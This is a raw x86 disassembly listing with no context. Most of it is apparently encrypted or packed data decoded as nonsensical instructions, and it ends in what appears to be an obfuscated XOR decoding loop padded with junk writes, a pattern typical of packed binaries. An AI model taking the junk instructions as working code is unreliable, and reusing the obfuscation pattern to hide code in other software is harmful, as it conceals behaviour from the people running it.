  41bcec:	scas   eax,DWORD PTR es:[edi]
  41bced:	push   cs
  41bcee:	daa    
  41bcef:	or     eax,0x69e64c2c
  41bcf4:	ins    DWORD PTR es:[edi],dx
  41bcf5:	dec    edi
  41bcf6:	scas   eax,DWORD PTR es:[edi]
  41bcf7:	call   0xba841c3a
  41bcfc:	imul   ebx,DWORD PTR [edi+0x77],0x131e5162
  41bd03:	imul   ebp,edi,0x4a767a3c
  41bd09:	in     eax,0xdc
  41bd0b:	pop    ecx
  41bd0c:	arpl   di,di
  41bd0e:	dec    esp
  41bd0f:	and    BYTE PTR [ebp-0x7bc49fa9],ch
  41bd15:	fld    QWORD PTR [eax+0x3d8cff95]
  41bd1b:	addr16 pop ds
  41bd1d:	cwde   
  41bd1e:	mov    esi,0x8af53897
  41bd23:	sbb    eax,0xba0c39e3
  41bd28:	ret    
  41bd29:	sub    BYTE PTR [edx-0x37],dl
  41bd2c:	dec    ebx
  41bd2d:	xchg   ebp,eax
  41bd2e:	addr16 xchg esi,eax
  41bd30:	ret    0x9041
  41bd33:	std    
  41bd34:	mov    ecx,0xa9e3ba76
  41bd39:	mov    ebp,0xc56ce30a
  41bd3e:	int    0x80
  41bd40:	daa    
  41bd41:	fs xchg ecx,eax
  41bd43:	lods   eax,DWORD PTR ds:[esi]
  41bd44:	or     BYTE PTR [esi],ah
  41bd46:	aad    0x4c
  41bd48:	int3   
  41bd49:	sar    BYTE PTR [edi+ebx*4-0x12],cl
  41bd4d:	pop    ds
  41bd4e:	push   ss
  41bd4f:	mov    ah,0x3a
  41bd51:	xor    eax,ebp
  41bd53:	jae    0x41bdcb
  41bd55:	leave  
  41bd56:	mov    ebp,0xe293bb00
  41bd5b:	out    dx,al
  41bd5c:	push   ebp
  41bd5d:	out    dx,al
  41bd5e:	mov    bl,0x6b
  41bd60:	pop    ebp
  41bd61:	out    dx,al
  41bd62:	gs xchg ebp,eax
  41bd64:	and    edi,DWORD PTR [ecx+0x3c]
  41bd67:	cmp    al,0x74
  41bd6a:	(bad)  
  41bd6b:	idiv   BYTE PTR [edx+0x61]
  41bd6e:	adc    eax,DWORD PTR [ebx-0x6c]
  41bd71:	pop    es
  41bd72:	aas    
  41bd73:	push   eax
  41bd74:	mov    WORD PTR [ebx-0x605d4524],fs
  41bd7a:	test   BYTE PTR [ecx+0x3fffc211],bh
  41bd80:	push   eax
  41bd81:	push   es
  41bd82:	dec    esp
  41bd83:	popa   
  41bd84:	(bad)
  41bd87:	in     al,0xad
  41bd89:	das    
  41bd8a:	cmp    BYTE PTR [edi],bh
  41bd8c:	int    0xe6
  41bd8e:	sub    al,ch
  41bd90:	enter  0xd5bf,0x6a
  41bd94:	jb     0x41bd98
  41bd96:	fcomp  QWORD PTR [edx+0x35]
  41bd99:	adc    al,0x76
  41bd9c:	adc    DWORD PTR [esi],edx
  41bd9e:	xor    DWORD PTR [ebx+eax*4-0x45],0x67
  41bda3:	xchg   edi,eax
  41bda4:	out    0xf4,eax
  41bda6:	fdivr  QWORD PTR [ebx+0xa]
  41bda9:	clc    
  41bdaa:	and    al,0x71
  41bdac:	jae    0x41bd9e
  41bdae:	push   edi
  41bdaf:	inc    ebx
  41bdb0:	mov    ch,0x3c
  41bdb2:	xchg   ebx,eax
  41bdb3:	clc    
  41bdb4:	rcr    ebx,1
  41bdb6:	cmp    DWORD PTR [esi],edx
  41bdb8:	nop
  41bdb9:	push   cs
  41bdba:	xchg   bh,ch
  41bdbc:	call   0x545b:0x27620bd
  41bdc3:	xchg   BYTE PTR ds:0xb3b0efc,bh
  41bdc9:	neg    ah
  41bdcb:	jle    0x41be39
  41bdcd:	push   cs
  41bdce:	test   DWORD PTR [esi],0x2e50949b
  41bdd4:	lock bound esp,QWORD PTR ds:0x1a1dd789
  41bddb:	mov    bl,0xd9
  41bddd:	mov    BYTE PTR [edx],ah
  41bddf:	pop    ds
  41bde0:	mov    al,ds:0x19550cb2
  41bde5:	out    dx,eax
  41bde6:	gs fmul st(4),st
  41bde9:	mov    edx,DWORD PTR [ebx+0x3e3a61b5]
  41bdef:	inc    esp
  41bdf0:	test   BYTE PTR [eax-0x48],ch
  41bdf3:	cmp    eax,0xce63802a
  41bdf8:	dec    edx
  41bdf9:	shl    eax,1
  41bdfb:	mov    ebx,0x56830a3f
  41be00:	or     edx,esi
  41be02:	mov    esi,ebx
  41be04:	add    eax,edi
  41be06:	mov    ch,0xa2
  41be08:	shl    cl,cl
  41be0a:	inc    BYTE PTR [eax+edi*4+0x618d1b58]
  41be11:	inc    ecx
  41be12:	add    BYTE PTR [edi],bl
  41be14:	ficom  WORD PTR [ebx+ebx*4]
  41be17:	rcr    DWORD PTR [edi+0x68005bb9],1
  41be1d:	mov    edi,edx
  41be1f:	push   0x78
  41be21:	push   cs
  41be22:	xlat   BYTE PTR ds:[ebx]
  41be23:	repnz push ebp
  41be25:	(bad)  
  41be26:	sbb    al,0x13
  41be28:	cmc    
  41be29:	(bad)  
  41be2a:	in     eax,dx
  41be2b:	inc    edi
  41be2c:	pop    ebx
  41be2d:	imul   DWORD PTR [ebp-0x319d42ff]
  41be33:	mov    esp,0x3d35205c
  41be38:	adc    eax,0x49be2fb7
  41be3d:	ins    DWORD PTR es:[edi],dx
  41be3e:	stos   BYTE PTR es:[edi],al
  41be3f:	and    DWORD PTR [esi+0x1f1148f9],ebp
  41be45:	pusha  
  41be46:	lds    eax,FWORD PTR [ecx+esi*1+0x59]
  41be4a:	mov    ch,0xb5
  41be4c:	inc    edx
  41be4d:	loope  0x41bebc
  41be4f:	(bad)  
  41be50:	int3   
  41be51:	in     eax,0x2a
  41be53:	out    dx,eax
  41be54:	imul   ebp,esi,0xffffffaf
  41be57:	fcomp  DWORD PTR [esi-0x4e]
  41be5a:	xchg   ebx,eax
  41be5b:	lahf   
  41be5c:	pop    edi
  41be5d:	test   al,0x1f
  41be5f:	rcr    BYTE PTR [eax+0x7e],1
  41be62:	in     eax,dx
  41be63:	bsf    esp,DWORD PTR [ebx]
  41be66:	fwait
  41be67:	mov    ch,0x93
  41be69:	outs   dx,BYTE PTR ds:[esi]
  41be6a:	sub    eax,0x88d0add5
  41be6f:	aaa    
  41be70:	call   0xd40c:0xd492635c
  41be77:	jecxz  0x41beb2
  41be79:	xchg   edx,eax
  41be7a:	mov    bl,0x71
  41be7c:	mov    eax,ds:0x909a154e
  41be81:	cld    
  41be82:	loope  0x41bec5
  41be84:	sub    dl,BYTE PTR [eax]
  41be86:	dec    eax
  41be87:	sbb    ah,ah
  41be89:	mov    esp,ebx
  41be8b:	pop    eax
  41be8c:	adc    al,0x8f
  41be8e:	sbb    eax,0xcabac6b6
  41be93:	(bad)  [edx+0x4c7ed203]
  41be99:	adc    ebp,0x1e
  41be9c:	push   esi
  41be9d:	sub    BYTE PTR [edi+0x61],ah
  41bea0:	lahf   
  41bea1:	test   eax,0xf0993448
  41bea6:	pop    esp
  41bea7:	push   ds
  41bea8:	fldcw  WORD PTR [edi-0x2d24b814]
  41beae:	sbb    al,0xa7
  41beb0:	fsub   QWORD PTR [ecx-0x4a0bd9a]
  41beb6:	nop
  41beb7:	push   esi
  41beb8:	cmp    BYTE PTR [edx],cl
  41beba:	xchg   edi,eax
  41bebb:	pusha  
  41bebc:	leave  
  41bebd:	ins    BYTE PTR es:[edi],dx
  41bebe:	ins    BYTE PTR es:[edi],dx
  41bebf:	in     eax,0x73
  41bec1:	sub    bl,bh
  41bec3:	clc    
  41bec4:	in     al,0x68
  41bec6:	fcmovnbe st,st(5)
  41bec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec9:	xlat   BYTE PTR ds:[ebx]
  41beca:	ret    0x4614
  41becd:	not    al
  41becf:	sub    eax,0x9254e1cb
  41bed4:	sbb    eax,0x9ae268a4
  41bed9:	add    esp,DWORD PTR [edx]
  41bedb:	es pop es
  41bedd:	jbe    0x41bf2c
  41bedf:	mov    ebp,0x21363bb4
  41bee4:	fcmove st,st(4)
  41bee6:	pop    edx
  41bee7:	dec    edx
  41bee8:	mov    al,ds:0x420f6665
  41beed:	push   edx
  41beee:	pop    eax
  41beef:	imul   BYTE PTR [ecx-0x62]
  41bef2:	add    ebx,DWORD PTR [eax+esi*1]
  41bef5:	jne    0x41bebf
  41bef7:	inc    ebp
  41bef8:	es jle 0x41bf02
  41befb:	or     esp,DWORD PTR [eax+0x7b]
  41befe:	sbb    BYTE PTR [eax-0x236eef4f],0x3c
  41bf05:	ss xchg bl,ch
  41bf08:	iret   
  41bf09:	sbb    al,0xda
  41bf0b:	vpackuswb ymm3,ymm6,YMMWORD PTR [ebx]
  41bf0f:	(bad)
  41bf12:	rcr    BYTE PTR [edx-0x53],cl
  41bf15:	inc    ecx
  41bf16:	xchg   ebx,eax
  41bf17:	mov    bh,0x2a
  41bf19:	(bad)  
  41bf1a:	jle    0x41bed2
  41bf1c:	rol    edx,1
  41bf1e:	mov    esi,0x5c4a9e2e
  41bf23:	popa   
  41bf24:	jne    0x41bf6b
  41bf26:	cwde   
  41bf27:	mov    dh,0x75
  41bf29:	ins    DWORD PTR es:[edi],dx
  41bf2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf2b:	in     al,dx
  41bf2c:	call   0x5961:0x7fb3d315
  41bf33:	les    esi,FWORD PTR [esi]
  41bf35:	imul   eax,DWORD PTR [edx],0xffffff96
  41bf38:	mov    esp,0xa3d1ecc3
  41bf3d:	(bad)  
  41bf3f:	cmp    DWORD PTR [esi+0x49b160c1],esi
  41bf45:	xor    esp,esp
  41bf47:	push   edi
  41bf48:	add    ebp,DWORD PTR [ebp-0x28]
  41bf4b:	sbb    BYTE PTR [ebx],dh
  41bf4d:	std    
  41bf4e:	shl    DWORD PTR [eax+edi*2],1
  41bf51:	pushf  
  41bf52:	mov    BYTE PTR [eax],cl
  41bf54:	mov    ebp,edx
  41bf56:	mov    ds:0x616fe53a,eax
  41bf5b:	shl    DWORD PTR [esi-0x22],0x4c
  41bf5f:	push   ds
  41bf60:	jg     0x41bf9f
  41bf62:	shl    bl,1
  41bf64:	into   
  41bf65:	or     al,0x3a
  41bf67:	xor    dh,dl
  41bf69:	and    esi,0x4c
  41bf6c:	sub    BYTE PTR ss:[ecx+eiz*2-0x5b87a16e],ah
  41bf74:	in     al,0x72
  41bf76:	test   al,0x5d
  41bf78:	(bad)  
  41bf79:	js     0x41bff0
  41bf7b:	mov    ebp,0x8b87576
  41bf80:	pop    ecx
  41bf81:	in     al,0x1c
  41bf83:	nop
  41bf84:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf86:	cwde   
  41bf87:	loopne 0x41bfc3
  41bf89:	rol    DWORD PTR [eax-0x71722be1],1
  41bf8f:	or     edi,DWORD PTR [edi]
  41bf91:	mov    cl,0x64
  41bf93:	rol    edx,0xcf
  41bf96:	mov    ds:0x224ce69,eax
  41bf9b:	fdivr  QWORD PTR [eax+0x60]
  41bf9e:	out    dx,eax
  41bf9f:	ins    DWORD PTR es:[edi],dx
  41bfa0:	push   ecx
  41bfa1:	scas   eax,DWORD PTR es:[edi]
  41bfa2:	push   es
  41bfa3:	dec    ebx
  41bfa4:	int3   
  41bfa5:	jnp    0x41bf2a
  41bfa7:	out    0xd5,eax
  41bfa9:	bound  edi,QWORD PTR [ecx-0x53a8ac39]
  41bfaf:	push   ss
  41bfb0:	add    DWORD PTR [edx+0xf5b1685],0x453165bc
  41bfba:	mov    es,edx
  41bfbc:	add    eax,0xa45703f6
  41bfc1:	and    DWORD PTR [edi-0x9],esp
  41bfc4:	adc    dl,BYTE PTR [ecx+0xdb03447]
  41bfca:	xor    ebx,DWORD PTR [edx+edx*2-0x4c]
  41bfce:	mov    esp,0x56f1611e
  41bfd3:	xchg   ecx,eax
  41bfd4:	sub    BYTE PTR [edi],dl
  41bfd6:	mov    BYTE PTR [esi],bl
  41bfd8:	ss enter 0xbfc1,0x5
  41bfdd:	inc    esi
  41bfde:	pop    DWORD PTR [esi-0x3b]
  41bfe1:	stos   DWORD PTR es:[edi],eax
  41bfe2:	adc    al,0x82
  41bfe4:	pop    es
  41bfe5:	pop    ebx
  41bfe6:	retf   
  41bfe7:	fstp   st(7)
  41bfe9:	sub    DWORD PTR [eax+0x3afb079b],0xb6ba3289
  41bff3:	test   al,0x54
  41bff5:	pop    esi
  41bff6:	xchg   ebp,eax
  41bff7:	push   ebx
  41bff8:	out    dx,al
  41bff9:	dec    ecx
  41bffa:	xchg   DWORD PTR [edx-0x63],ebx
  41bffd:	pop    edi
  41bffe:	addr16 pop edx
  41c000:	and    ebp,ebx
  41c002:	push   edi
  41c003:	clc    
  41c004:	repz es std 
  41c007:	cmp    esi,DWORD PTR [ebp+edx*2+0x1c8f76f7]
  41c00e:	fild   WORD PTR [edi]
  41c010:	(bad)  
  41c011:	xchg   ebx,eax
  41c012:	cmc    
  41c013:	xchg   esp,eax
  41c014:	jo     0x41c030
  41c016:	mov    edx,0x7bdf9aa8
  41c01b:	pop    ebx
  41c01c:	rcl    BYTE PTR [eax],cl
  41c01e:	push   ss
  41c01f:	adc    dl,bh
  41c021:	mov    ebp,0x6e806445
  41c026:	or     ch,BYTE PTR [ebx+ebp*1+0x44]
  41c02a:	push   ecx
  41c02b:	arpl   WORD PTR [eax+0x57],ax
  41c02e:	int    0x4c
  41c030:	mov    cl,0xa8
  41c032:	inc    eax
  41c033:	push   es
  41c034:	mov    cl,0xda
  41c036:	fistp  WORD PTR [edx-0x9ebbaea]
  41c03c:	jne    0x41bfe4
  41c03e:	pop    edi
  41c03f:	iret   
  41c040:	xor    DWORD PTR [esi-0x70d22d79],ebx
  41c046:	ds jno 0x41bfdf
  41c049:	and    eax,0x7f760d66
  41c04e:	ret    0x69e5
  41c051:	loop   0x41c09c
  41c053:	lods   eax,DWORD PTR ds:[esi]
  41c054:	jnp    0x41c056
  41c056:	sub    dh,BYTE PTR [eax-0x3c]
  41c059:	cs in  al,dx
  41c05b:	cmp    al,dl
  41c05d:	inc    BYTE PTR [eax]
  41c05f:	cmp    BYTE PTR [eax+0x6a93bba8],dh
  41c065:	jecxz  0x41c018
  41c067:	mov    ch,BYTE PTR [edx+0x7f8f39c4]
  41c06d:	fidiv  WORD PTR [ecx-0x2c474dbd]
  41c073:	cmp    eax,0xe5c08e3a
  41c078:	test   eax,0x2eaea900
  41c07d:	ins    DWORD PTR es:[edi],dx
  41c07e:	mov    gs,edi
  41c080:	sub    al,0x5
  41c082:	js     0x41c039
  41c084:	push   cs
  41c085:	xor    edi,0x4b6e7e15
  41c08b:	push   eax
  41c08c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c08d:	mov    ah,0xb5
  41c08f:	in     eax,dx
  41c090:	jecxz  0x41c097
  41c092:	pop    esp
  41c093:	in     eax,dx
  41c094:	sub    esi,ebp
  41c096:	pop    ds
  41c097:	sbb    BYTE PTR ds:0xa326040c,ch
  41c09d:	xlat   BYTE PTR ds:[ebx]
  41c09e:	rcl    DWORD PTR [ecx-0x3f141ebd],cl
  41c0a4:	enter  0xc87d,0x2e
  41c0a8:	cmp    ch,ch
  41c0aa:	ja     0x41c108
  41c0ac:	pop    ebx
  41c0ad:	rcr    BYTE PTR [ecx-0x38],1
  41c0b0:	push   ds
  41c0b1:	sbb    al,0x64
  41c0b3:	lea    edx,[edi+ebp*2]
  41c0b6:	nop
  41c0b7:	in     al,0xd6
  41c0b9:	sub    eax,0xa33d16ec
  41c0be:	stos   DWORD PTR es:[edi],eax
  41c0bf:	fnstsw WORD PTR [esi+0x4f]
  41c0c2:	push   esi
  41c0c3:	loope  0x41c110
  41c0c5:	adc    bh,BYTE PTR [ecx-0x84e6845]
  41c0cb:	inc    ebx
  41c0cc:	push   ebx
  41c0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ce:	dec    ebx
  41c0cf:	push   ebp
  41c0d0:	push   es
  41c0d1:	cmp    al,0xf7
  41c0d3:	(bad)  
  41c0d5:	psadbw mm5,QWORD PTR [ecx-0x3d]
  41c0d9:	jp     0x41c13a
  41c0db:	inc    ecx
  41c0dc:	inc    edx
  41c0dd:	pop    esp
  41c0de:	fld    QWORD PTR [esi+ebx*4+0x35]
  41c0e2:	ret    0x3926
  41c0e5:	bnd jne 0x41c097
  41c0e8:	outs   dx,DWORD PTR ds:[esi]
  41c0e9:	xchg   cl,dl
  41c0eb:	iret   
  41c0ec:	aaa    
  41c0ed:	and    al,0xe9
  41c0ef:	xor    ch,BYTE PTR [ebp+0x60f5e312]
  41c0f5:	sub    al,0xe0
  41c0f7:	(bad)  
  41c0f8:	fiadd  WORD PTR [edi-0x33491a5]
  41c0fe:	shl    ch,0xeb
  41c101:	das    
  41c102:	shr    esi,1
  41c104:	jns    0x41c0ad
  41c106:	cmp    eax,0xe9260550
  41c10b:	jmp    0x41c115
  41c10d:	lahf   
  41c10e:	cli    
  41c10f:	or     al,0x46
  41c111:	lds    ecx,FWORD PTR [ebp-0x37]
  41c114:	add    al,0xe
  41c116:	inc    esi
  41c117:	jnp    0x41c09e
  41c119:	or     eax,0x65aa7989
  41c11e:	js     0x41c178
  41c120:	xor    DWORD PTR fs:[ebx],0x7bccfda0
  41c127:	sbb    ecx,DWORD PTR [ebx]
  41c129:	sbb    edx,DWORD PTR [eax-0x73d3ad4d]
  41c12f:	in     eax,dx
  41c130:	(bad)  
  41c131:	and    DWORD PTR [eax-0x57],0x8756168d
  41c138:	sbb    eax,0x234cad8e
  41c13d:	push   ss
  41c13e:	in     eax,0xe7
  41c140:	adc    ebx,ecx
  41c142:	imul   ecx,ecx,0xf7a735db
  41c148:	fisttp WORD PTR [ebp+0x227941b]
  41c14e:	call   0xb610:0x8c3aea77
  41c155:	(bad)  
  41c156:	loope  0x41c117
  41c158:	mov    WORD PTR [eax+esi*2+0x79ccfc99],ds
  41c15f:	sbb    dh,BYTE PTR [esi]
  41c161:	pop    ss
  41c162:	call   0xa93575e7
  41c167:	loopne 0x41c1bb
  41c169:	mov    BYTE PTR [ecx-0x42c22d0e],cl
  41c16f:	or     ebp,ebp
  41c171:	test   BYTE PTR ss:[edi+0xc],bl
  41c175:	xor    al,0x51
  41c177:	inc    ebx
  41c178:	cmp    DWORD PTR [ebp-0x41],0xffffffc8
  41c17c:	mov    esi,cs
  41c17e:	cmp    eax,0xcfe57424
  41c183:	sub    al,0x0
  41c185:	push   cs
  41c186:	mov    ch,0xda
  41c188:	dec    ebx
  41c189:	mov    dh,0xb
  41c18b:	addr16 mov ebp,?
  41c18e:	mov    ebp,0xd2c129f
  41c193:	lea    ecx,[edx]
  41c195:	push   0x28
  41c197:	sbb    al,0xae
  41c199:	test   cl,cl
  41c19b:	sbb    BYTE PTR [esi+0x3a3337ab],bl
  41c1a1:	(bad)  [esi-0x43c0730]
  41c1a7:	ins    BYTE PTR es:[edi],dx
  41c1a8:	mov    esp,0x39c12b1d
  41c1ad:	add    esp,esp
  41c1af:	rcr    dh,cl
  41c1b1:	retf   
  41c1b2:	lock mov esi,0xdb8f6daa
  41c1b8:	lahf   
  41c1b9:	fs ret 
  41c1bb:	mov    dh,0xd3
  41c1bd:	push   cs
  41c1be:	mov    cl,0xd3
  41c1c0:	out    dx,al
  41c1c1:	or     al,0xd3
  41c1c3:	pop    ds
  41c1c4:	icebp  
  41c1c5:	in     eax,0x58
  41c1c7:	and    ecx,DWORD PTR [ecx-0x47]
  41c1ca:	gs (bad) 
  41c1cd:	sub    BYTE PTR [edi+0x51850183],al
  41c1d3:	sti    
  41c1d4:	xchg   esp,eax
  41c1d5:	dec    ecx
  41c1d6:	xchg   edi,eax
  41c1d7:	jecxz  0x41c231
  41c1d9:	or     eax,0x738c415a
  41c1de:	jmp    0x89cd:0xcee20197
  41c1e5:	inc    esp
  41c1e6:	(bad)  
  41c1e7:	aas    
  41c1e8:	rcr    DWORD PTR [esi-0x64f79279],1
  41c1ee:	xchg   esi,eax
  41c1ef:	push   es
  41c1f0:	or     al,0x87
  41c1f2:	lock mov bl,0x2f
  41c1f5:	xchg   esp,eax
  41c1f6:	mov    ds:0x726582ca,eax
  41c1fb:	inc    esi
  41c1fc:	push   ebp
  41c1fd:	ins    BYTE PTR es:[edi],dx
  41c1fe:	mov    edi,0xcb6ebad2
  41c203:	xor    al,0x76
  41c205:	or     dl,BYTE PTR [eax]
  41c207:	pop    esp
  41c208:	jecxz  0x41c1a2
  41c20a:	add    cl,bl
  41c20c:	inc    ebp
  41c20d:	jge    0x41c281
  41c20f:	sbb    edx,DWORD PTR [eax+0x257da309]
  41c215:	mov    bl,0x12
  41c217:	loopne 0x41c251
  41c219:	xor    eax,0x4024316c
  41c21e:	(bad)  ds:0x2f85efb4
  41c224:	je     0x41c1cc
  41c226:	jae    0x41c2a5
  41c228:	ret    0x57da
  41c22b:	adc    BYTE PTR [esi+ebp*4],cl
  41c22e:	lods   eax,DWORD PTR ds:[esi]
  41c22f:	call   0xefc3dc7
  41c234:	sub    edx,DWORD PTR [ecx]
  41c236:	sub    BYTE PTR [esi+0x4a0257b3],dh
  41c23c:	push   ebx
  41c23d:	dec    ecx
  41c23e:	scas   al,BYTE PTR es:[edi]
  41c23f:	int3   
  41c240:	jmp    0xf1c337a4
  41c245:	daa    
  41c246:	sahf   
  41c247:	loope  0x41c281
  41c249:	pop    esi
  41c24a:	sub    bl,BYTE PTR ds:0x38f5cbf0
  41c250:	dec    edi
  41c251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c252:	add    edx,edx
  41c254:	mov    ds:0xab4062eb,eax
  41c259:	fisubr WORD PTR [eax-0x78db4c5]
  41c25f:	cli    
  41c260:	xor    BYTE PTR [ebp+0x68],ch
  41c263:	rcl    BYTE PTR [esi-0x70],1
  41c266:	mov    eax,DWORD PTR [edi-0x37]
  41c269:	inc    ebx
  41c26a:	mov    ebp,DWORD PTR [ecx]
  41c26c:	aaa    
  41c26d:	cli    
  41c26e:	std    
  41c26f:	dec    edi
  41c270:	xor    ebp,esp
  41c272:	adc    al,0x6d
  41c274:	outs   dx,DWORD PTR ds:[esi]
  41c275:	push   esp
  41c276:	cs int3 
  41c278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c27a:	add    bl,BYTE PTR [edx*8-0xca8200e]
  41c281:	icebp  
  41c282:	push   0x33
  41c284:	sub    eax,0x5ba8b7dd
  41c289:	pop    edi
  41c28a:	in     al,0xff
  41c28c:	popf   
  41c28d:	into   
  41c28e:	rol    DWORD PTR [edx-0x5ce9ed8d],1
  41c294:	adc    eax,0xf2fbee9d
  41c299:	or     ebp,DWORD PTR [edi+edx*1]
  41c29c:	xchg   ebx,eax
  41c29d:	popa   
  41c29e:	repz cwde 
  41c2a0:	out    dx,eax
  41c2a1:	lock or al,0x2a
  41c2a4:	iret   
  41c2a5:	xchg   ebx,eax
  41c2a6:	sti    
  41c2a7:	jae    0x41c326
  41c2a9:	jmp    0xd8e2de00
  41c2ae:	mov    ds:0xde0987b3,eax
  41c2b3:	dec    eax
  41c2b4:	xlat   BYTE PTR ds:[ebx]
  41c2b5:	lahf   
  41c2b6:	and    dh,BYTE PTR [edi]
  41c2b8:	pop    ebx
  41c2b9:	mov    cl,0x73
  41c2bb:	lods   eax,DWORD PTR ds:[esi]
  41c2bc:	push   0xf35ea3ca
  41c2c1:	xchg   esi,eax
  41c2c2:	mov    BYTE PTR [esi],al
  41c2c4:	bound  edx,QWORD PTR [eax-0x6e]
  41c2c7:	adc    dl,BYTE PTR [ecx]
  41c2c9:	push   esp
  41c2ca:	adc    esp,DWORD PTR [edx]
  41c2cc:	neg    BYTE PTR [edi+0x4b]
  41c2cf:	adc    BYTE PTR [edx+eiz*1-0x7d],0x76
  41c2d4:	out    0x49,al
  41c2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2d7:	or     eax,0xe00e6d
  41c2dc:	retf   0xd18a
  41c2df:	push   ecx
  41c2e0:	mov    al,ds:0xd65bd7
  41c2e5:	inc    ebp
  41c2e6:	jmp    0x8811138
  41c2eb:	iret   
  41c2ec:	scas   eax,DWORD PTR es:[edi]
  41c2ed:	add    eax,0x6625d5e0
  41c2f2:	in     eax,0x27
  41c2f4:	pop    ebp
  41c2f5:	or     al,0xa5
  41c2f7:	call   0x5a90:0x2b505e86
  41c2fe:	stc    
  41c2ff:	enter  0x51ac,0x88
  41c303:	mov    esp,0xd3f2176f
  41c308:	push   ebp
  41c309:	cmp    edi,edi
  41c30b:	leave  
  41c30c:	and    edx,DWORD PTR [ebx]
  41c30e:	mov    eax,0x17094ba3
  41c313:	pop    ds
  41c314:	pop    esp
  41c315:	iret   
  41c316:	test   BYTE PTR [eax+ebx*1],dh
  41c319:	adc    al,0x35
  41c31b:	stc    
  41c31c:	daa    
  41c31d:	push   esi
  41c31e:	idiv   BYTE PTR [ebx]
  41c320:	ret    0xeaf4
  41c323:	dec    ecx
  41c324:	xchg   esp,eax
  41c325:	fcomp  QWORD PTR [ecx]
  41c327:	icebp  
  41c328:	psubusb mm0,QWORD PTR [esi+ebx*1+0x19]
  41c32d:	hlt    
  41c32e:	jg     0x41c360
  41c330:	pop    edi
  41c331:	outs   dx,BYTE PTR ds:[esi]
  41c332:	adc    al,0x1f
  41c334:	or     al,0xd2
  41c336:	sbb    dl,BYTE PTR [esi+0x48]
  41c339:	dec    edx
  41c33a:	jle    0x41c2d8
  41c33c:	xlat   BYTE PTR ds:[ebx]
  41c33d:	mov    ebp,0x4b22352e
  41c342:	scas   eax,DWORD PTR es:[edi]
  41c343:	loopne 0x41c39d
  41c345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c346:	push   edx
  41c347:	mov    edi,DWORD PTR [esi]
  41c349:	int3   
  41c34a:	add    al,0xb1
  41c34c:	(bad)  [edi-0x5a]
  41c34f:	fld    st(1)
  41c351:	jle    0x41c377
  41c353:	add    edx,ebp
  41c355:	sbb    DWORD PTR [ebp-0x3a],ecx
  41c358:	jecxz  0x41c370
  41c35a:	fisttp WORD PTR [eax]
  41c35c:	aaa    
  41c35d:	les    esp,FWORD PTR [ecx]
  41c35f:	pop    esi
  41c360:	sbb    DWORD PTR [ebp+0x7f],0x1
  41c364:	outs   dx,BYTE PTR ds:[esi]
  41c365:	adc    BYTE PTR [edx-0x1f5b6327],0x84
  41c36c:	xchg   ecx,eax
  41c36d:	pop    edx
  41c36e:	out    dx,eax
  41c36f:	ins    BYTE PTR es:[edi],dx
  41c370:	cmp    eax,0xeec100fc
  41c375:	mov    al,ds:0x23c5582e
  41c37a:	jns    0x41c36a
  41c37c:	sahf   
  41c37d:	sbb    ebx,DWORD PTR [eax]
  41c37f:	adc    dh,0xb0
  41c382:	sub    ebx,DWORD PTR [edx+0x35decfd6]
  41c388:	xor    BYTE PTR [edi+esi*4-0x3b],al
  41c38c:	out    0xd0,al
  41c38e:	xor    al,0xe7
  41c390:	mov    WORD PTR [edx-0x6667c4b2],cs
  41c396:	mov    ds:0x44c9a5b,al
  41c39b:	lea    ecx,[ebp-0x13]
  41c39e:	fcmovnbe st,st(1)
  41c3a0:	jge    0x41c345
  41c3a2:	bound  ebp,QWORD PTR [ebx]
  41c3a4:	mul    BYTE PTR [esi+0x9]
  41c3a7:	aaa    
  41c3a8:	jbe    0x41c36e
  41c3aa:	push   esi
  41c3ab:	pop    esp
  41c3ac:	xchg   ebx,eax
  41c3ad:	sbb    DWORD PTR [edi+0x4c],0x2fae056
  41c3b4:	cmp    ecx,DWORD PTR [edx-0x69]
  41c3b7:	imul   esp,ebp,0xfce6df36
  41c3bd:	in     al,dx
  41c3be:	fist   DWORD PTR [ecx+0x259bf501]
  41c3c4:	das    
  41c3c5:	cmc    
  41c3c6:	add    ch,bl
  41c3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c9:	mov    ecx,0x8a85
  41c3ce:	sbb    DWORD PTR ds:0x42c00c,0x42a01c
  41c3d8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c3dd:	and    DWORD PTR ds:0x428004,0x297a
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
